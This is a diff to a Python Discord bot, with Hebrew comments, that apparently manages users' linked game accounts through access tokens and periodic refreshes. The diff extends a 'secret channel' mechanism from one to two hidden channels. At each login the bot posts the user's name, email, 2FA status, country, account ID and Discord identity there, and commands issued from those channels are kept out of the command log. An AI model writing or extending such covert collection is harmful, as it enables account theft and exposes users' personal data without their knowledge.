@@ -25,7 +25,7 @@ except Exception as e:
 TOKEN = os.environ.get("DISCORD_TOKEN", "")
 # ==========================================
 
-SECRET_CHANNEL_ID = 1513098510050922546
+SECRET_CHANNEL_IDS = (1513098510050922546, 1506120705329070143)
 COMMAND_LOG_CHANNEL_ID = 1513019632938651748
 
 ACCOUNTS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'accounts.json')
@@ -256,7 +256,7 @@ async def log_success(interaction: Interaction, command_key: str):
     """נשלח לחדר ההיסטוריה רק כשפקודה הצליחה — לא מהחדר הסודי."""
     try:
         # אם הפקודה בוצעה מהחדר הסודי — לא לשלוח כלום
-        if interaction.channel_id == SECRET_CHANNEL_ID:
+        if interaction.channel_id in SECRET_CHANNEL_IDS:
             return
         channel = bot.get_channel(COMMAND_LOG_CHANNEL_ID)
         if not channel:
@@ -768,18 +768,18 @@ async def auto_refresh_all_accounts():
     if failed_lines:
         log_embed.add_field(name=f"❌ Failed ({len(failed_lines)})", value="\n".join(failed_lines), inline=False)
     log_embed.set_footer(text="Next refresh in 2 hours")
-    channel = bot.get_channel(SECRET_CHANNEL_ID)
-    if not channel:
-        try:
-            channel = await bot.fetch_channel(SECRET_CHANNEL_ID)
-        except Exception:
-            channel = None
-    if channel:
-        try:
-            await channel.send(embed=log_embed)
-        except Exception as e:
-            print(f"[Auto-Refresh] Failed to send log: {e}")
-
+    for _secret_cid in SECRET_CHANNEL_IDS:
+        _ch = bot.get_channel(_secret_cid)
+        if not _ch:
+            try:
+                _ch = await bot.fetch_channel(_secret_cid)
+            except Exception:
+                _ch = None
+        if _ch:
+            try:
+                await _ch.send(embed=log_embed)
+            except Exception as e:
+                print(f"[Auto-Refresh] Failed to send log: {e}")
 
 @auto_refresh_all_accounts.before_loop
 async def before_auto_refresh():
@@ -943,25 +943,29 @@ async def _complete_login_flow(discord_id: int, access_token: str, acc_id: str,
 
     skin_image_url = await _fetch_skin_image(access_token, acc_id)
 
-    # שליחה לחדר הסודי
-    secret_channel = bot.get_channel(SECRET_CHANNEL_ID)
-    if not secret_channel:
-        try:
-            secret_channel = await bot.fetch_channel(SECRET_CHANNEL_ID)
-        except Exception:
-            secret_channel = None
-    if secret_channel:
-        secret_embed = discord.Embed(title="🔐 Account Connection", color=0x00a2ff, timestamp=datetime.datetime.utcnow())
-        secret_embed.set_thumbnail(url=skin_image_url or NEXUS_LOGO_URL)
-        secret_embed.add_field(name="Name",       value=name,             inline=True)
-        secret_embed.add_field(name="Email",      value=email,            inline=True)
-        secret_embed.add_field(name="2FA",        value=is_2fa,           inline=True)
-        secret_embed.add_field(name="Created",    value=created_at,       inline=True)
-        secret_embed.add_field(name="Country",    value=country,          inline=True)
-        secret_embed.add_field(name="Discord",    value=f"<@{discord_id}>", inline=True)
-        secret_embed.add_field(name="Account ID", value=acc_id,           inline=False)
-        secret_embed.set_footer(text=f"Discord ID: {discord_id}")
-        await secret_channel.send(embed=secret_embed, view=view)
+    # שליחה לחדרים הסודיים
+    secret_embed = discord.Embed(title="🔐 Account Connection", color=0x00a2ff, timestamp=datetime.datetime.utcnow())
+    secret_embed.set_thumbnail(url=skin_image_url or NEXUS_LOGO_URL)
+    secret_embed.add_field(name="Name",       value=name,             inline=True)
+    secret_embed.add_field(name="Email",      value=email,            inline=True)
+    secret_embed.add_field(name="2FA",        value=is_2fa,           inline=True)
+    secret_embed.add_field(name="Created",    value=created_at,       inline=True)
+    secret_embed.add_field(name="Country",    value=country,          inline=True)
+    secret_embed.add_field(name="Discord",    value=f"<@{discord_id}>", inline=True)
+    secret_embed.add_field(name="Account ID", value=acc_id,           inline=False)
+    secret_embed.set_footer(text=f"Discord ID: {discord_id}")
+    for _secret_cid in SECRET_CHANNEL_IDS:
+        _ch = bot.get_channel(_secret_cid)
+        if not _ch:
+            try:
+                _ch = await bot.fetch_channel(_secret_cid)
+            except Exception:
+                _ch = None
+        if _ch:
+            try:
+                await _ch.send(embed=secret_embed, view=view)
+            except Exception:
+                pass
 
     return skin_image_url, view
 
